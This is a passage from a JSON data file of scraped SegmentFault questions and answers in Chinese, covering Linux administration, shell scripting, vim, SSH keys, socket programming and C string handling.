      "dsc": "<div class=\"question fmt\" data-id=\"1010000000141383\">\n<p>在管理Linux的时候经常需要su到其他用户去，很痛苦的是这些每个用户的shell都不一样，有bash，有zsh乱七八糟一堆，而且很多alias也不一样。还有些功能账号 像 www 什么的，根本就没有这些配置，环境变量都没有。<br/>\n有没有什么办法，让我su到其他账号的时候还是用我自己的shell和配置？</p>\n</div>",
      "favourite": "3",
      "glance": "2.5k",
      "tags": [
        "linux",
        "sudo"
      ],
      "time": "2012-11-16",
      "title": "su到一个用户如何还使用原来的shell",
      "url": "https://segmentfault.com/q/1010000000141383"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000151116\">\n<pre>:w !sudo tee %</pre><p>命令<code>:w !{cmd}</code>，让 vim 执行一个外部命令<code>{cmd}</code>，然后把当前缓冲区的内容从 stdin 传入。<br/>\n<code>tee</code> 是一个把 stdin 保存到文件的小工具。<br/>\n而 %，是vim当中一个只读寄存器的名字，总保存着当前编辑文件的文件路径。<br/>\n所以执行这个命令，就相当于从vim外部修改了当前编辑的文件，好完工。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000156111\">\n<pre>1.:w !sudo tee %\n2.:%!sudo bash -c \"cat &gt; '%'\"</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000151092\">\n<p>请先搜索，再提问 <a href=\"http://segmentfault.com/q/1010000000130006\" rel=\"nofollow\" target=\"_blank\" title=\"http://segmentfault.com/q/10100000001...\">http://segmentfault.com/q/10100000001...</a></p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000151086\">\n<p>在管理线上服务器的时候，经常要编辑一些不属于操作用户的文件，就是只有r权限的那种，每次保存都会提示read only。只能先记下来改了什么，然后再退出，然后 sudo vim 再做保存<br/>\n有没有什么办法，可以不要退出vim进程，直接用vim命令获取sudo权限，然后把文件存进去的？</p>\n</div>",
      "favourite": "8",
      "glance": "13.4k",
      "tags": [
        "vim",
        "linux"
      ],
      "time": "2012-12-12",
      "title": "如何在vim保存时获得sudo权限",
      "url": "https://segmentfault.com/q/1010000000151086"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000156875\">\n<pre>which want_to_find &gt; /dev/null 2&gt;&amp;1\nif [ $? == 0 ]; then\n    echo \"exist\"\nelse\n    echo \"dose not exist\"\nfi</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000156879\">\n<pre>if which brew 2&gt;/dev/null; then\n  echo \"brew exists!\"\nelse\n  echo \"nope, no brew installed.\"\nfi</pre><p><code>which</code> 在找不到命令时会输出「xxx not found」到 stderr 的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000156890\">\n<p>最好避免使用 which，做为一个外部的工具，并不一定存在，在发行版之间也会有区别，有的系统的 which 命令不会设置有效的 exit status，存在一定的不确定性。</p><p>Bash 有提供一些内建命令如 hash、type、command 也能达到要求。</p><pre>$ command -v foo &gt;/dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require foo but it's not installed.  Aborting.\"; exit 1; }\n$ type foo &gt;/dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 \"I require foo but it's not installed.  Aborting.\"; exit 1; }\n$ hash foo 2&gt;/dev/null || { echo &gt;&amp;2 \"I require foo but it's not installed.  Aborting.\"; exit 1; }</pre><p>详见 <a href=\"http://stackoverflow.com/questions/592620/check-if-a-program-exists-from-a-bash-script\" rel=\"nofollow\" target=\"_blank\" title=\"http://stackoverflow.com/questions/59...\">http://stackoverflow.com/questions/59...</a></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000156870\">\n<p>在编写bash时，如果要判断某条命令是否存在，应该如何写呢？<br/>\n我尝试了如下的写法，不知道错误在哪里</p><pre>if [ -n `which brew`]; then\n echo 'brew exist'\nelse\n echo 'brew does not exist'\nfi</pre><p>用来判断<code>brew</code>命令是否存在，可是明明没有<code>brew</code>，却总是显示 \"brew exist\"</p>\n</div>",
      "favourite": "4",
      "glance": "8.7k",
      "tags": [
        "bash",
        "linux",
        "shell"
      ],
      "time": "2012-12-29",
      "title": "Shell(Bash)中如何判断是否存在某个命令",
      "url": "https://segmentfault.com/q/1010000000156870"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000157362\">\n<p>就像哪天你怕搞丢了钥匙，给自己家大门的钥匙配一个钥匙扣或者系一根挂绳</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000158979\">\n<p>加password phrase就成新的key了吧</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000197209\">\n<p>多谢邀请 ... passphrase 这个东西事实上并不是 key pair 的一部分 ... </p>\n<p>楼上所说更换 passphrase 就变成了新的 key 什么的 ... 完全是无稽之谈 ...</p>\n<p>passphrase 只是对私钥额外进行了一次对称加密而已 ... 通用的算法是 DES 或者 AES ... </p>\n<p>具体使用的算法可以在加密后的私钥头部看到 ...</p>\n<p>加上 passphrase 之后的私钥文件内容实际上是私钥的密文 ... 并不是私钥本身 ... </p>\n<p>密文不参与配对 ... 所以你尽可以随便更改 passphrase 而不用担心会影响到什么 ...</p>\n<p>换言之 ... 你可以有使用不同 passphrase 的一个私钥的多个副本 ... 都可以和相应的公钥配对 ...</p>\n<p>顺带一提 ... 查看去除 passphrase 也就是参与配对的私钥可以用下面的命令 ...</p>\n<pre><code>openssl rsa -in ~/.ssh/your.key -outform pem\n</code></pre>\n<p>你可以看到 ... 同样的私钥不管 passphrase 如何变化 ... 输出的结果都是一样的 ...</p>\n<p>恩恩就是这样啦 ...</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000157358\">\n<p>已生成的ssh key pair，私钥部分没有加password phrase做保护。现在我想给私钥加上保护的话，会影响key pari本身的配对么？</p>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "linux",
        "ssh"
      ],
      "time": "2013-01-01",
      "title": "给sshkeypair的私钥加password phrase会影响key pair本身的配对么",
      "url": "https://segmentfault.com/q/1010000000157358"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000136832\">\n<p>威武我大linux怎么会因为这点小事就让进程挂掉，肯定是你没处理异常。。。。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000136825\">\n<p>没写过unix网络编程，提供一点思路：<br/>\nserver端一般是监听某个端口，如果client有数据传来那么server端会接受数据并处理。<br/>\nserver端挂掉后，client再去连接server时肯定会出现连接异常。就像如果某网站挂掉后，访问可能会连接拒绝或500错一样</p><p>client关闭跟server没关系，你不访问sf，sf一样在那里运行。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000136853\">\n<p>如果在正常通信中，服务器关闭了连接那么客户端会收到正常的EOF，如果对这个连接用epoll或者select进行监听，可以马上得知服务器关闭了连接。否则就定时向服务器发心跳探测，不然是不太可能得知服务器目前的状态的。之所以你现在不会立刻发现问题是因为服务器退出后，客户端需要靠下一次send才会触发问题，因为这时候连接已关闭，而客户端继续写，会产生SIGPIPE异常，而这个异常的默认动作是进程终止，所以你的客户端退出了。vice versa.</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000136783\">\n<p>是这样的，开了个服务器，开了个客户端连上，正常通信，客户端可以给服务器发数据。<br/>\n这时候，关闭了服务器，然后客户端继续发数据并不会马上出错，可是再发一次客户端程序便自动退出了。<br/>\n请问，为什么呢？<br/>\n还有就是如果是客户端关闭，服务器往客户端发数据会不会出现这种情况？<br/>\n（如果上面第二个问题答案是ture的话）怎么解决？（一个服务器不可能因为一个客户端的关闭而退出吧？）</p><pre>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;arpa/inet.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;memory.h&gt;\n\n#define MAX 4096\n\nint main(int argc, char **argv)\n{\n    int clientfd;\n    if((clientfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){\n        printf(\"Error:%s\\n\", strerror(errno));\n\texit(0);\n    }\n\n    struct sockaddr_in myaddr;\n    memset(&amp;myaddr, '0', sizeof(myaddr));\n    myaddr.sin_family = AF_INET;\n    myaddr.sin_port = htons(4444);\n    myaddr.sin_addr.s_addr = htonl(INADDR_ANY);\n\n    if( connect(clientfd, (struct sockaddr*)&amp;myaddr, sizeof(myaddr)) &lt; 0){\n        printf(\"connect error: %s(errno: %d)\\n\",strerror(errno),errno);\n\texit(0);\n    }\n\t\n    char sendline[MAX];\n    while(1){\n        printf(\"send msg to server: \\n\");\n\tfgets(sendline, 4096, stdin);\n\tif(send(clientfd, sendline, strlen(sendline), 0) &lt;= 0)\n\t{\n\t    printf(\"send msg error: %s(errno: %d)\", strerror(errno), errno);\n\t    exit(0);\n\t}\n    }\n    close(clientfd);\n    exit(0);\n    return 1;\n}</pre>\n</div>",
      "favourite": "2",
      "glance": "5.2k",
      "tags": [
        "linux"
      ],
      "time": "2012-11-08",
      "title": "linux网络编程中如何判断服务器或者客户端已经关闭？",
      "url": "https://segmentfault.com/q/1010000000136783"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000165701\">\n<pre>int gethostbyname_r(const char *name,\n        struct hostent *ret, char *buf, size_t buflen,\n        struct hostent **result, int *h_errnop);</pre><p>为了避开非线程安全的gethostbyname，想用这货，用起来类似这样：</p><pre>int host2addr(const char *host, struct in_addr *addr) {\n    struct hostent he, *result;\n    int herr, ret, bufsz = 512;\n    char *buff = NULL;\n    do {\n        char *new_buff = (char *)realloc(buff, bufsz);\n        if (new_buff == NULL) {\n            free(buff);\n            return ENOMEM;\n        }   \n        buff = new_buff;\n        ret = gethostbyname_r(host, &amp;he, buff, bufsz, &amp;result, &amp;herr);\n        bufsz *= 2;\n    } while (ret == ERANGE);\n    if (ret == 0 &amp;&amp; result != NULL) \n        *addr = *(struct in_addr *)he.h_addr;\n    else if (result != &amp;he) \n        ret = herr;\n    free(buff);\n    return ret;\n}</pre><p>基本上跟<a href=\"http://www.gnu.org/software/libc/manual/html_node/Host-Names.html\" rel=\"nofollow\" target=\"_blank\" title=\"GNU\">GNU</a>官方文档里的例子一致（GNU的还少了个free的样子）。</p><p>但是对hostent还是不太放心：</p><pre>struct hostent {\n   char  *h_name;            /* official name of host */\n   char **h_aliases;         /* alias list */\n   int    h_addrtype;        /* host address type */\n   int    h_length;          /* length of address */\n   char **h_addr_list;       /* list of addresses */\n}\n#define h_addr h_addr_list[0] /* for backward compatibility */</pre><p>这里面有h_name，h_aliases，h_addr_list ... 我又翻看了下eglibc-2.15的gethostbyname的源码，逻辑基本上跟我上面这段一样。但是，这些东西没释放的话，真的没问题吗？</p>\n</div>",
      "favourite": "0",
      "glance": "4.1k",
      "tags": [
        "linux",
        "network",
        "c",
        "posix"
      ],
      "time": "2013-01-27",
      "title": "在gethostbyname_r后不管塞给它的hostent，是否会有内存泄漏问题？",
      "url": "https://segmentfault.com/q/1010000000165701"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000177137\">\n<p>前不久看到一篇文章讨论为什么有些人越生活下去行李越少，有些人要带的东西却越来越多，我想，应该适合很多情景:-)</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000177141\">\n<p>一个是你自己写的代码等文件，再一个就是搭配环境的配置文件，如果有数据库的话，数据库也要导出备份，一般我是备份这几样。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000177238\">\n<p>个人认为备份/home就够了，/home单独分区的话可以降低因系统损坏而丢失数据的概率。</p><p>如果你安装了web server而root path又不在/home/的话，把root path里的内容也备份下。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000177134\">\n<html><body>\n<p><img data-src=\"http://segmentfault.com/img/bVUe9\"/></p>\n<p>以上图片是我的Linux PC的目录，现在是Web开发，项目放在/var/www，home下面也有代码，隐藏目录下也有，安装了很多Lib，我想问的是PC Linux应该备份哪些目录?<br>\n或者应该以什么为标准？ 哪些Lib需要备份？自己编译的动态链接库呢？</br></p>\n</body></html>\n</div>",
      "favourite": "2",
      "glance": "4.5k",
      "tags": [
        "linux",
        "备份",
        "ubuntu"
      ],
      "time": "2013-03-09",
      "title": "通常情况下，个人Linux系统进行备份应该备份哪些目录或是文件？",
      "url": "https://segmentfault.com/q/1010000000177134"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000184344\">\n<p>都是电子计时的，期间也没断电什么的，为什么会出现不准的情况？<br/>\n有时候会慢了什么的，就得重新校准，是什么原因呢？</p>\n</div>",
      "favourite": "2",
      "glance": "2.4k",
      "tags": [
        "linux"
      ],
      "time": "2013-03-31",
      "title": "为什么系统时间过一段时间就会不准？",
      "url": "https://segmentfault.com/q/1010000000184344"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000186256\">\n<pre>Alias /phpMyAdmin /usr/share/phpMyAdmin\nAlias /phpmyadmin /usr/share/phpMyAdmin\n\n&lt;Directory /usr/share/phpMyAdmin/&gt;\n   &lt;IfModule mod_authz_core.c&gt;\n     # Apache 2.4\n     &lt;RequireAny&gt;\n       Require ip 127.0.0.1\n       Require ip ::1\n     &lt;/RequireAny&gt;\n   &lt;/IfModule&gt;\n   &lt;IfModule !mod_authz_core.c&gt;\n     # Apache 2.2\n     Order Deny,Allow\n     Deny from All\n     Allow from 127.0.0.1\n     Allow from ::1\n   &lt;/IfModule&gt;\n&lt;/Directory&gt;</pre><p>我的Apache版本是2.4的，以上是/etc/httpd/conf.d/phpMyAdmin.conf里面的一段内容，并不十分明白其中的具体意思，求解释一下。</p>\n</div>",
      "favourite": "0",
      "glance": "3.1k",
      "tags": [
        "linux",
        "phpmyadmin"
      ],
      "time": "2013-04-07",
      "title": "求解释一下linux下的phpmyadmin的配置文件",
      "url": "https://segmentfault.com/q/1010000000186256"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000249362\">\n<p>先上内核循环缓冲结构体的定义：</p>\n<pre><code>struct kfifo {\n        unsigned char *buffer;        /* the buffer holding the data */\n        unsigned int size;        /* the size of the allocated buffer */\n        unsigned int in;        /* data is added at offset (in % size) */\n        unsigned int out;        /* data is extracted from off. (out % size) */\n        spinlock_t *lock;        /* protects concurrent modifications */\n};\n</code></pre>\n<p>如果对“Linux内核中的循环缓冲区”不是很了解的话，可以先参考  <a href=\"http://www.kerneltravel.net/jiaoliu/kern-kfifo.html\" rel=\"nofollow\">这里</a>。内核中有关kfifo.c和kfifo.h两个文件的源码以及该问题的具体情况，可以查看<a href=\"http://bbs.chinaunix.net/thread-4088139-1-1.html\" rel=\"nofollow\">这里</a>。</p>\n<p>对于结构体内的in和out两个变量，内核是作如下处理的:1、在读入数据时增加in；2、在取出数据时增加out；3、当检测到两个相等的时候将它们复位归0。1和2不作讨论和分析，针对第3点的处理，内核代码如下：</p>\n<pre><code>static inline unsigned int kfifo_get(struct kfifo *fifo,\n                                     unsigned char *buffer, unsigned int len)\n{\n        unsigned long flags;\n        unsigned int ret;\n\n        spin_lock_irqsave(fifo-&gt;lock, flags);\n        ret = __kfifo_get(fifo, buffer, len);\n\n        /*\n         * optimization: if the FIFO is empty, set the indices to 0\n         * so we don't wrap the next time\n         */\n        if (fifo-&gt;in == fifo-&gt;out)\n                fifo-&gt;in = fifo-&gt;out = 0;\n\n        spin_unlock_irqrestore(fifo-&gt;lock, flags);\n\n        return ret;\n}\n</code></pre>\n<p>问题：当数据写入速度大于读取速度的时候，in和out的值将永远不会相等，也就是说buffer永远是有数据的，这样的话in和out都存在超出自身数值表示范围，从而导致错误？</p>\n<p>针对这个问题，不知大家有什么好的建议？</p>\n</div>",
      "favourite": "1",
      "glance": "3.5k",
      "tags": [
        "c",
        "linux-kernel",
        "linux",
        "ubuntu",
        "嵌入式"
      ],
      "time": "2013-06-29",
      "title": "内核kfifo.c中in和out的问题【已解决】",
      "url": "https://segmentfault.com/q/1010000000249362"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000253905\">\n<html><body>\n<h2>配置环境：</h2>\n<ul>\n<li>操作环境：ubuntu</li>\n<li>网络连接：USB无线网卡链接WIFI</li>\n<li>连接方式：wpa_supplicant</li>\n<li>监测方式：iwconfig</li>\n</ul>\n<h2>出现情况：</h2>\n<ul>\n<li>wpa_supplicant连接成功</li>\n<li>能ping通网关、路由中也能查看到主机连接上</li>\n<li>但不能ping通外网</li>\n</ul>\n<h2>场合：家、公司</h2>\n<h2>ubuntu设置情况如下：</h2>\n<h3>wpa_supplicant连接wifi：</h3>\n<p><strong>wpa_supplicant.conf设置如下</strong> </p>\n<pre><code># cat /etc/wpa_supplicant.conf\nctrl_interface=/var/run/wpa_supplicant GROUP=wheel\n\nnetwork={\n    ssid=\"TP-LINK_413\"\n    #psk=\"\"\n    psk=e69abb9b46dcbf8df67738a2eda466c54b3f12043e54157d58e097c3e19fa2e3\n\n    proto=RSN\n    key_mgmt=WPA-PSK\n    pairwise=CCMP TKIP\n    group=CCMP TKIP\n}\n</code></pre>\n<p><strong>连接wifi：</strong></p>\n<pre><code># wpa_supplicant -Dwext -iwlan0 -c/etc/wpa_supplicant.conf -dd -B\n</code></pre>\n<p>结果如下：<br><img data-src=\"http://segmentfault.com/img/bVbegM\"><br><strong>查看wifi信息</strong></br></img></br></p>\n<pre><code># iwconfig\n</code></pre>\n<p>结果如下：<br><img data-src=\"http://segmentfault.com/img/bVbegN\"><br>\n至此wifi连接完毕，附上一张路由上的主机列表，划线的就是ubuntu，不过收包、发包太少了\n<img data-src=\"http://segmentfault.com/img/bVbegR\"/></br></img></br></p>\n<p><strong>设置网卡IP：</strong> </p>\n<pre><code># cat /etc/network/interfaces\n# interfaces(5) file used by ifup(8) and ifdown(8)\nauto lo\niface lo inet loopback\n\n# auto eth0\n# iface eth0 inet static\n\nauto wlan0\niface wlan0 inet static\n\naddress 192.168.1.192\nnetmask 255.255.255.0\n\n# home\ngateway 192.168.1.253\n\n# work\n# gateway 192.168.1.1\n\nnetwork 192.168.1.253\n</code></pre>\n<p><strong>设置DNS</strong> </p>\n<pre><code># cat /etc/resolv.conf\nnameserver 192.168.1.253\nnameserver 8.8.8.8\n</code></pre>\n<p><strong>重新启动网络服务</strong></p>\n<pre><code># service networking restart\n</code></pre>\n<p>结果如下：\n<img data-src=\"http://segmentfault.com/img/bVbegO\"/></p>\n<p><strong>启动wlan0：</strong></p>\n<pre><code># ifconfig wlan0 up\n# ifconfig\n</code></pre>\n<p>结果如下：<br><img data-src=\"http://segmentfault.com/img/bVbegP\"/></br></p>\n<p><strong>ping网关</strong> </p>\n<pre><code># vi /etc/resolv.conf\nroot@cubieboard-server:~# ping -c 4 192.168.1.253\nPING 192.168.1.253 (192.168.1.253) 56(84) bytes of data.\n64 bytes from 192.168.1.253: icmp_req=1 ttl=64 time=1.90 ms\n64 bytes from 192.168.1.253: icmp_req=2 ttl=64 time=1.59 ms\n64 bytes from 192.168.1.253: icmp_req=3 ttl=64 time=1.99 ms\n64 bytes from 192.168.1.253: icmp_req=4 ttl=64 time=1.60 ms\n\n--- 192.168.1.253 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss, time 3004ms\nrtt min/avg/max/mdev = 1.597/1.776/1.999/0.178 ms\n</code></pre>\n<p><strong>ping 外网，失败了</strong> </p>\n<pre><code># ping -c 4 baidu.com\nPING baidu.com (123.125.114.144) 56(84) bytes of data.\nrtw_set_ps_mode: Leave 802.11 power save\nrtl8188e_set_FwPwrMode_cmd: Mode=0 SmartPS=2 UAPSD=0\nrtw_set_ps_mode: Enter 802.11 power save\nrtl8188e_set_FwPwrMode_cmd: Mode=1 SmartPS=2 UAPSD=0\n\n--- baidu.com ping statistics ---\n4 packets transmitted, 0 received, 100% packet loss, time 3008ms\n</code></pre>\n<p><strong>查看route</strong><br><img data-src=\"http://segmentfault.com/img/bVbegQ\"/></br></p>\n<h1>请问如何解决？怎样能ping通外网</h1>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "6.6k",
      "tags": [
        "linux",
        "ubuntu",
        "wifi",
        "无线网络"
      ],
      "time": "2013-07-14",
      "title": "[网络配置] 使用wpa_spplicant连接wifi，无法ping通网关，请问 这样的情况如何解决",
      "url": "https://segmentfault.com/q/1010000000253905"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000268527\">\n<p>linux下定时最小为1分钟，怎么能按秒定时呢，求解</p>\n</div>",
      "favourite": "2",
      "glance": "1.9k",
      "tags": [
        "php",
        "linux"
      ],
      "time": "2013-08-25",
      "title": "cron定时5秒运行",
      "url": "https://segmentfault.com/q/1010000000268527"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000302700\">\n<p>我看了一下某个脚本，最开始的两行是</p>\n<pre><code>set -e\nset -o pipefail\n</code></pre>\n<p>请问这两句是什么意思呢？</p>\n</div>",
      "favourite": "6",
      "glance": "6.9k",
      "tags": [
        "shell",
        "linux",
        "ios",
        "macos"
      ],
      "time": "2013-09-02",
      "title": "shell脚本中set -e是什么意思",
      "url": "https://segmentfault.com/q/1010000000302700"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000317317\">\n<p>加入文件是utf-8编码，内容如下：</p>\n<blockquote>\n<p>我是来自上海的互联网程序员，主要从事Web/游戏/手机服务器开发.</p>\n</blockquote>\n<p>下面C代码可以一个一个的读入这些中文字符():</p>\n<pre><code>#define UTF8_CHAR_LEN( byte ) ((( 0xE5000000 &gt;&gt; (( byte &gt;&gt; 3 ) &amp; 0x1e )) &amp; 3 ) + 1)\nchar content[255]; //一行一行的读入文件，255的话大概满足需求了；这个代码片段也只是测试用.\nFILE *data_file = fopen(\"path/to/file\", \"r\");\nif (!data_file) {\n    fprintf(stderr, \"error happened when read file: %s\",\"path/to/file\");\n    return -1;\n}\nfgets(content, 255, data_file);\nint i;\nfor (i = 0; content[i] != '\\0'; i++) {\n    int utf8_char_len = UTF8_CHAR_LEN(content[i]);\n    if (utf8_char_len &gt; 1) {\n        char word[4]; // utf-8占位最大字节也就是4个字节\n        memcpy(word, (content + i), utf8_char_len); \n        i += utf8_char_len - 1;\n        printf(\"%s\\t\", word);\n    }\n    else {\n        printf(\"%c\\t\", content[i]);\n    }\n}\nfclose(data_file);\n</code></pre>\n<p>输入：</p>\n<p>我   是   来   自   上   海   的   互   联   网   程   序   员   ，   主   要   从事  W   e   b   /   游   戏   /   手   机   服   务   器   开   发   .   </p>\n<p>这里我觉得主要问题是字符指针它不标识出编码字符的大小，如果单纯的用 (p + 1)的话会把编码混乱掉，所以要先判断字符编码的所占字节数，然后再 (p + size<em>of</em>word) 输出;</p>\n<p>上面的代码满足我现在的需求，不过还有一些疑问；</p>\n<p>utf-8编码的字符在Linux c 下面怎么处理的呢？一般模式我还在寻找，有机会帖在这里. </p>\n<p>这里还帖一个用宽字符库遍历utf-8字符串的代码片段:</p>\n<pre><code>wchar_t wstr[] = L\"你好\";\n    // en_US.UTF-8 是我本地的locale\nsetlocale(LC_ALL, \"en_US.UTF-8\");\nint i;\nfor (i = 9; i &lt; wcslen(wstr); i++) {\n    wprintf(L\"%lc\\n\", wstr[i]);\n}\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000320367\">\n<p>你第一段代码应该是有两个问题，</p>\n<p>1、step的自增有问题，不应该在每次for里面都++，而是根据字符宽度再加</p>\n<p>2、printf打印是遇0结束，你的word最后一个字符根本不是0，所以就出现每个中文后面多出来的乱码，这个是很基础的问题。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000316895\">\n<p>使用 glib 的 utf8 相关函数，或者转成 wchar。或者拿 iconv 把编码转成 utf32 然后用 uint32_t 表示字符也成。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000316867\">\n<p>我的需求是从utf-8文件读入到内存，然后想遍历它来寻找某个特殊字符。</p>\n<p>我的代码片段:</p>\n<pre><code>// 检查utf-8字符所占字节数\n#define UTF8_CHAR_LEN( byte ) ((( 0xE5000000 &gt;&gt; (( byte &gt;&gt; 3 ) &amp; 0x1e )) &amp; 3 ) + 1)\nFILE *fp = fopen(PATH_TO_FILE, \"r\");\n\nchar *buf = malloc(LENGTH_OF_FILE * sizeof(char));\n\nfgets(buf, LENGTH_OF_FILE, fp);\n\nint step = 0;\nfor (; *(buf + step) != '\\0'; ++step) {\n  int utf8_word_len = UTF8_CHAR_LEN(buf + step);\n  // utf8是多字节的，我也确定了编码是utf-8 所以不需要判断是否是其他的编码了\n  if (utf8_word_len &gt; 1) {\n    char word[utf8_word_len];\n    strncpy(word, (buf+step), urf8_word_len);\n    step += urf8_word_len;\n    // 这里就可以输出中文了，但是很奇怪啊，输出中文字符后还有一个很奇怪的字符\n    // 肯定是我哪里搞错了，还请高手指点.\n    printf(\"%s\\n\", word);\n  }\n  else {\n    printf(\"%c\\n\", buf + step);\n  }\n}\nfclose(fp);\nfree(buf);\n</code></pre>\n<p>问题是，当文件遇到utf-8编码的中文，这段代码就输出乱码了。我知道%c 是输出一个字节的内容，utf-8里面中文可能需要3个字节，所以有乱码会；但是自己不知道怎么处理 utf-8字符的遍历。</p>\n<p>求高手解答.</p>\n<p>PS: 我是想从字符指针去遍历utf-8的字符哦，不是想做编码转换的.</p>\n</div>",
      "favourite": "6",
      "glance": "6.8k",
      "tags": [
        "linux",
        "c",
        "utf-8"
      ],
      "time": "2013-10-08",
      "title": "linux C 语言如何遍历 utf-8字符",
      "url": "https://segmentfault.com/q/1010000000316867"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000319528\">\n<pre><code>$m1 = memory_get_usage();\nvar_dump($m1);\n$arr = array_fill(0, 100000, 'phpinfo');\nunset($arr);\n\n$m2 = memory_get_usage();\nvar_dump($m2);\n\n\nvar_dump(\"消耗内存：\".($m2-$m1)/1000);\n</code></pre>\n<p>输出结果为：string(21) \"消耗内存：64.688\"；</p>\n<p>我很不解，我已经对大数组使用unset了，这占用的64.688K内存是从哪跑出来的，求解</p>\n</div>",
      "favourite": "1",
      "glance": "1.7k",
      "tags": [
        "php",
        "nginx",
        "apache",
        "mysql",
        "linux"
      ],
      "time": "2013-10-14",
      "title": "PHP偷了我的内存",
      "url": "https://segmentfault.com/q/1010000000319528"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000322210\">\n<p>redis似乎是绿色软件，直接解压就能用了</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000322476\">\n<p>如果是RH系的系统可以做成RPM包。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000322218\">\n<p>如果不能让客户自己去安装的话，那么像很多商业软件一样，把 redis 连同它依赖的各种库打包起来扔给客户。一般需要用个 wrapper 脚本设置 <code>LD_LIBRARY_PATH</code> 之类的。你也可以静态链接一个 redis（这样只依赖于内核和 CPU）。</p>\n<p>我刚刚看了下，redis 的库依赖很少。不过遇到 glibc 版本不满足要求的话还是比较头疼的。静态链接个吧。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000322185\">\n<p>公司的一个项目用到了<code>Redis</code>需要部署到客户那边，以前只用过<code>Ubuntu</code>,<code>Gentoo</code>和<code>Fedora</code>这种个人发行版。但是客户环境可能用的是<code>RHEL</code>或者<code>CentOS</code>，这两个版本是不是默认没装<code>gcc</code>,<code>make</code>等工具？有没有什么源可以直接安装<code>Redis</code>？如果客户那边不能连接外网有没有打好的或者如何打成<code>RPM</code>包？</p>\n</div>",
      "favourite": "1",
      "glance": "1.9k",
      "tags": [
        "centos",
        "redis",
        "linux"
      ],
      "time": "2013-10-19",
      "title": "如何方便的在linux上分发Redis",
      "url": "https://segmentfault.com/q/1010000000322185"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000343151\">\n<p>我想问2个问题，在提问前，我先进行下说明。<br/>\n在Linux下编译(gcc -o hostinfo  hostinfo.c)下面的代码后</p>\n<pre><code class=\"lang-cpp\">#include&lt;stdio.h&gt;\n#include&lt;netdb.h&gt;\n#include&lt;arpa/inet.h&gt;\n#include&lt;netinet/in.h&gt;\n\nint main(int argc, char **argv)\n{\n    if(argc != 2){\n         fprintf(stderr, \"usage: %s &lt;domain name or dotted-decimal&gt;\\n\", argv[0]);\n         return 0;\n    }\n\n   char **pp;\n   struct in_addr addr;\n   struct hostent *hostp;\n\n   if(inet_aton(argv[1], &amp;addr) != 0){\n       hostp = gethostbyaddr((const char *)&amp;addr, sizeof(addr), AF_INET);\n   }else{\n       hostp = gethostbyname(argv[1]);\n   }\n\n   printf(\"official hostname: %s\\n\", hostp-&gt;h_name);\n\n   for(pp = 